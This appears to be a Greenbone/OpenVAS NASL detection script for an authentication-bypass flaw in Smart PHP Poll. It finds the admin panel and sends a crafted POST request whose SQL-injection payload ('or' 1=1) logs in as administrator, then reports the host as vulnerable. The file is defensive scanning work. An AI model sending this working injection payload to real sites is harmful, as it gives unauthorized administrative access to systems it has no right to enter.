if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805506" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2015-03-17 15:24:03 +0530 (Tue, 17 Mar 2015)" );
	script_name( "Smart PHP Poll Authentication Bypass Vulnerability" );
	script_tag( name: "summary", value: "This host is installed with Smart PHP Poll
  and is prone to authentication bypass vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted request via HTTP GET and
  check whether it is able to bypass authentication oe not." );
	script_tag( name: "insight", value: "The flaw exists due to inadequate
  validation of input passed via POST parameters 'admin_id' and 'admin_pass'
  to admin.php script" );
	script_tag( name: "impact", value: "Successful exploitation will allow
  remote attackers to bypass the authentication." );
	script_tag( name: "affected", value: "Smart PHP Poll" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "exploit" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/36386" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
http_port = http_get_port( default: 80 );
if(!http_can_host_php( port: http_port )){
	exit( 0 );
}
host = http_host_name( port: http_port );
for dir in nasl_make_list_unique( "/", "/smart_php_poll", "/poll", http_cgi_dirs( port: http_port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/admin.php";
	rcvRes = http_get_cache( item: url, port: http_port );
	if(rcvRes && IsMatchRegexp( rcvRes, ">Smart PHP Poll.*Administration Panel<" )){
		postData = "admin_id=admin+%27or%27+1%3D1&admin_pass=admin+%27or%27+1%3D1";
		sndReq = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-www-form-urlencoded", "\\r\\n", "Content-Length: ", strlen( postData ), "\\r\\n\\r\\n", postData );
		rcvRes = http_send_recv( port: http_port, data: sndReq );
		if(rcvRes && ContainsString( rcvRes, ">Main Menu<" ) && ContainsString( rcvRes, ">Logout<" ) && ContainsString( rcvRes, ">Smart PHP Poll" )){
			security_message( port: http_port );
			exit( 0 );
		}
	}
}
exit( 99 );

